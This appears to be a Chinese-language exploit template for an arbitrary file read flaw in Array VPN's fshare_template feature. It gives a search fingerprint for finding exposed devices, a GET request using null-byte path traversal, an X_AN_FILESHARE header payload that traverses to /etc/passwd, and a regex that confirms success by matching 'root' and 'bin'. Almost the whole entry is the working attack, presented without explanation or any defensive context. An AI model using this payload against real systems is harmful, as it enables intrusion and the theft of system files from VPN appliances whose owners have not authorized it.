# ArrayVPNfshare_template任意文件读取漏洞

ArrayVPNfshare ｜ 任意文件读取/写入 ｜ —
- **指纹**：`product="Array-VPN"`
- **请求**：`GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1`

**Payload**
```
X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd
```
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$